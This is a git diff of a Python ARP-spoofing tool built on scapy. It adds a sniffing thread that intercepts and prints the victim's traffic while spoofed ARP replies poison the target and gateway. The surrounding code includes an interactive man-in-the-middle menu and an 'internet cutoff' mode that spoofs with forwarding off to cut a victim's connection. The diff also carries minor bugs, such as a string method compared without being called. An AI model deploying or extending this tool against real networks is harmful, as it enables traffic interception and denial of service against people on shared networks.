@@ -10,6 +10,10 @@ import nmap
 import netifaces
 import socket
 import winreg
+import threading
+
+from help import *
+from util import *
 
 # Available flags
 flags = {
@@ -28,28 +32,6 @@ options = [
     "Help",
     "Quit"
 ]
-
-def getHostOS(): # Get current operating system
-    return os.name
-
-
-def clearTerminal(): # Clear screen
-    osName = getHostOS()
-
-    if osName == 'posix':
-        os.system("clear")
-    else:
-        os.system("cls")
-
-# Wait for a key to be pressed before continuing
-def waitForKeyStroke():
-    osName = getHostOS()
-
-    if osName == 'posix':
-        os.system('read -s -n 1 -p "Press any key to continue"')
-    else:
-        os.system("pause")
-
 
 # Returns the IPv4 of the default gateway
 def getDefaultGateway():
@@ -257,12 +239,31 @@ def setIPForwarding(setKey):
             return 0
     
 
+def dumpPackets(packet):
+    if packet.haslayer(scapy.ARP) == False:
+        print(packet.summary())
+
+# Intercept packets
+def sniffPackets(target, port = None , _type = "any"):
+    while do:
+        if _type == "any":
+            scapy.sniff(filter = f"host {target}", prn = dumpPackets, count=1)
+        elif port:
+            scapy.sniff(filter = f"{_type} and host {target}", prn = dumpPackets, count=1)
+        else:
+            scapy.sniff(filter = f"{_type} and host {target}", prn = dumpPackets, count=1)
 
 # ARP Spoofer helper function (sends malicious ARP packet)
-def spoof(targetIP, targetMAC, gatewayIP, gatewayMAC, allowThrough = True):
+def spoof(targetIP, targetMAC, gatewayIP, gatewayMAC, allowThrough = True, summary = True):
+    t = threading.Thread(target=sniffPackets, args=(targetIP, None, "tcp",))
+    t.setDaemon(True)
+    flag = False
+    global do
+    do = True
+
     try:
         isForwardSet = setIPForwarding(allowThrough) # Enable/Disable IP forwarding
-            
+
         # If IP forwarding was successfuly altered:
         if isForwardSet == 1:
             print("Spoofing [{}] (CTRL + C to stop)".format(targetIP))
@@ -276,16 +277,25 @@ def spoof(targetIP, targetMAC, gatewayIP, gatewayMAC, allowThrough = True):
                 scapy.send(packet1, verbose = False)
                 scapy.send(packet2, verbose = False)
 
+                if not flag:
+                    t.start()
+                    flag = True
+
                 # Sleep for 2 seconds (Send an ARP response every 2 seconds)
                 time.sleep(2)
 
+        
         else:
             print("Unable to set IP forwarding to '{}'... quiting".format(int(allowThrough)))
             time.sleep(1.5)
             
     except KeyboardInterrupt:
         print("Keyboard interrupt detected. Exiting ARP Spoofer...")
+        
+        do = False
+    
         time.sleep(1.5)
+        return
 
 
 # Returns the network address given an IP and a subnet MASK in the CIDR notation (192.168.1.109/24 for example)
@@ -324,118 +334,129 @@ def ARPSpoofer():
     print(asciiBanner)
 
     if index == 0:
-        IP2Spoof = ""
+        try:
+            IP2Spoof = ""
 
-        # Get the IP to spoof
-        while True: 
-            clearTerminal()
-            print(asciiBanner)
-            IP2Spoof = input("Insert an IP to spoof: ")
+            # Get the IP to spoof
+            while True: 
+                clearTerminal()
+                print(asciiBanner)
+                IP2Spoof = input("Insert an IP to spoof: ")
 
-            if isValidIP(IP2Spoof)[0]: # The first return value [0] of isValidIP() is a True/False flag that indicates if a given IP is valid
-                break
+                if isValidIP(IP2Spoof)[0]: # The first return value [0] of isValidIP() is a True/False flag that indicates if a given IP is valid
+                    break
 
-            print("'{}' Is not a valid IP address".format(IP2Spoof))
+                print("'{}' Is not a valid IP address".format(IP2Spoof))
+                time.sleep(0.5)
+
+            # Get the gateway/router
+            defaultGateway = getDefaultGateway()
+            gw = ""
+
+            while True:
+                clearTerminal()
+                print(asciiBanner)
+                gw = input("Insert the gateway/router IP (default '{}'): ".format(defaultGateway))
+
+                if gw == "":
+                    gw = defaultGateway
+                    break
+
+                elif isValidIP(gw)[0]:
+                    break
+
+                print("'{}' Is not a valid IP address".format(gw))
+                time.sleep(0.5)
+
+            print("[+] Target IP: {}".format(IP2Spoof))
+            print("[+] Gateway: {}".format(gw))
             time.sleep(0.5)
 
-        # Get the gateway/router
-        defaultGateway = getDefaultGateway()
-        gw = ""
+            print("Validating target's IP...")
+            isValid = validateHost(IP2Spoof)
+            # If the target doesn't belong to the same network as me, exit
+            if not isValid:
+                print("The specified IP address '{}' does not belong to the same network as you".format(IP2Spoof))
 
-        while True:
-            clearTerminal()
-            print(asciiBanner)
-            gw = input("Insert the gateway/router IP (default '{}'): ".format(defaultGateway))
+            time.sleep(0.7)
 
-            if gw == "":
-                gw = defaultGateway
-                break
+            print("Validating gateway IP...")
+            isValidGW = validateHost(gw)
 
-            elif isValidIP(gw)[0]:
-                break
+            if not isValidGW:
+                print("The specified gateway '{}' cannot be reached".format(gw))
+            
 
-            print("'{}' Is not a valid IP address".format(gw))
-            time.sleep(0.5)
+            # Only spoof the target if the hosts are validated
+            if isValid and isValidGW:
+                # Check if the hosts are UP before trying to spoof them
+                time.sleep(1.5)
+                print("Checking if hosts are UP...")
+                scanner = nmap.PortScanner()
+                time.sleep(1)
+                print("[+] Pinging '{}'".format(IP2Spoof))
+                scanner.scan(IP2Spoof, '1', '-v')
+                stateTarget = scanner[IP2Spoof].state()
+                
+                if stateTarget != 'up':
+                    print("[+] Target is [DOWN]")
+                else:
+                    print("[+] Target is [UP]")
 
-        print("[+] Target IP: {}".format(IP2Spoof))
-        print("[+] Gateway: {}".format(gw))
-        time.sleep(0.5)
+                time.sleep(1)
+                print("[+] Pinging '{}'".format(gw))
+                scanner.scan(gw, '1', '-v')
+                stateGW = scanner[gw].state()
 
-        print("Validating target's IP...")
-        isValid = validateHost(IP2Spoof)
-        # If the target doesn't belong to the same network as me, exit
-        if not isValid:
-            print("The specified IP address '{}' does not belong to the same network as you".format(IP2Spoof))
+                if stateGW != 'up':
+                    print("[+] Gateway is [DOWN]")
+                else:
+                    print("[+] Gateway is [UP]")
+                
+                # If both of the hosts are UP, the spoofing can start
+                if stateGW == 'up' and stateTarget == 'up':
+                    print("Starting the spoofer...")
+                    
+                    # Get MAC addresses of the target and the gateway
+                    targetMAC = getMAC(IP2Spoof)
+                    gwMAC = getMAC(gw)
 
-        time.sleep(0.7)
+                    if targetMAC == 0 and gwMAC != 0:
+                        print("Unable to get MAC address for '{}' (target)".format(IP2Spoof))
+                        print("The ARP Spoofer requires both MAC addresses...")
+                        waitForKeyStroke()
+                        return
+                    elif targetMAC != 0 and gwMAC == 0:
+                        print("Unable to get MAC address for '{}' (gateway)".format(gw))
+                        print("The ARP Spoofer requires both MAC addresses...")
+                        waitForKeyStroke()
+                        return
+                    elif targetMAC == 0 and gwMAC == 0:
+                        print("Unable to get both MAC addresses (target and gateway)")
+                        print("The ARP spoofer requires both MAC addresses...")
+                        waitForKeyStroke()
+                        return
 
-        print("Validating gateway IP...")
-        isValidGW = validateHost(gw)
+                    logIt = input("Would you like to get a log of the incomming packets? (y/n):")
 
-        if not isValidGW:
-            print("The specified gateway '{}' cannot be reached".format(gw))
+                    if logIt.upper == "Y":
+                        spoof(IP2Spoof, targetMAC, gw, gwMAC, summary=True) # Start the spoofer
+                    elif logIt.upper == "N":
+                        spoof(IP2Spoof, targetMAC, gw, gwMAC) # Start the spoofer
         
+                    
+                elif stateGW != 'up' or stateTarget != 'up':
+                    print("One of the hosts is not UP...")
+                    waitForKeyStroke()
 
-        # Only spoof the target if the hosts are validated
-        if isValid and isValidGW:
-            # Check if the hosts are UP before trying to spoof them
+                else:
+                    print("None of the hosts are up...")
+                    waitForKeyStroke()
+        
+        except KeyboardInterrupt:
+            print("\nKeyboard interrupt detected, exiting...")
             time.sleep(1.5)
-            print("Checking if hosts are UP...")
-            scanner = nmap.PortScanner()
-            time.sleep(1)
-            print("[+] Pinging '{}'".format(IP2Spoof))
-            scanner.scan(IP2Spoof, '1', '-v')
-            stateTarget = scanner[IP2Spoof].state()
-            
-            if stateTarget != 'up':
-                print("[+] Target is [DOWN]")
-            else:
-                print("[+] Target is [UP]")
 
-            time.sleep(1)
-            print("[+] Pinging '{}'".format(gw))
-            scanner.scan(gw, '1', '-v')
-            stateGW = scanner[gw].state()
-
-            if stateGW != 'up':
-                print("[+] Gateway is [DOWN]")
-            else:
-                print("[+] Gateway is [UP]")
-            
-            # If both of the hosts are UP, the spoofing can start
-            if stateGW == 'up' and stateTarget == 'up':
-                print("Starting the spoofer...")
-                
-                # Get MAC addresses of the target and the gateway
-                targetMAC = getMAC(IP2Spoof)
-                gwMAC = getMAC(gw)
-
-                if targetMAC == 0 and gwMAC != 0:
-                    print("Unable to get MAC address for '{}' (target)".format(IP2Spoof))
-                    print("The ARP Spoofer requires both MAC addresses...")
-                    waitForKeyStroke()
-                    return
-                elif targetMAC != 0 and gwMAC == 0:
-                    print("Unable to get MAC address for '{}' (gateway)".format(gw))
-                    print("The ARP Spoofer requires both MAC addresses...")
-                    waitForKeyStroke()
-                    return
-                elif targetMAC == 0 and gwMAC == 0:
-                    print("Unable to get both MAC addresses (target and gateway)")
-                    print("The ARP spoofer requires both MAC addresses...")
-                    waitForKeyStroke()
-                    return
-
-                spoof(IP2Spoof, targetMAC, gw, gwMAC) # Start the spoofer
-    
-                
-            elif stateGW != 'up' or stateTarget != 'up':
-                print("One of the hosts is not UP...")
-                waitForKeyStroke()
-
-            else:
-                print("None of the hosts are up...")
-                waitForKeyStroke()
 
 
     elif index == 1:
@@ -482,8 +503,13 @@ def ARPSpoofer():
                      waitForKeyStroke()
                      return
 
-                # Spoof
-                spoof(targetIP, MACTarget, defaultGateway, dfGWMAC)
+                logIt = str(input("Would you like to get a log of the incomming packets? (y/n):"))
+
+                if logIt.upper() == "Y":
+                    spoof(targetIP, MACTarget, defaultGateway, dfGWMAC, summary=True) # Start the spoofer
+                elif logIt.upper() == "N":
+                    spoof(targetIP, MACTarget, defaultGateway, dfGWMAC) # Start the spoofer
+
             
         except KeyboardInterrupt:
             print("\nKeyboard interrupt detected, exiting...")
@@ -576,6 +602,20 @@ def internetCutoff():
         spoof(targetIP, MACTarget, defaultGateway, dfGWMAC, False)
 
 
+# Show ARP table
+def ARPTable():
+    asciiBanner = pyfiglet.figlet_format("ARP Table")
+    clearTerminal()
+    print(asciiBanner)
+
+    lines = os.popen('arp -a')
+
+    for line in lines:
+        print(line)
+
+    waitForKeyStroke()
+
+
 def main(argv):
     argv.append("") # Add empty argument in the end bc I am too lazy
     gateway = ""
@@ -623,15 +663,21 @@ def main(argv):
             if index == 0: # Call the ARP Spoofer function
                 ARPSpoofer()
             
+            if index == 1: # Call ARP table
+                ARPTable()
+
             if index == 2: # Call connected machines function
                 connectedMachines()
 
             if index == 3: # Call internet cutoff function
                 internetCutoff()
 
+            if index == 4:
+                help()
+
             if index == len(options) - 1:
                 clearTerminal()
-                break
+                os._exit(0)
     
 if __name__ == "__main__":
     main(sys.argv[1:])
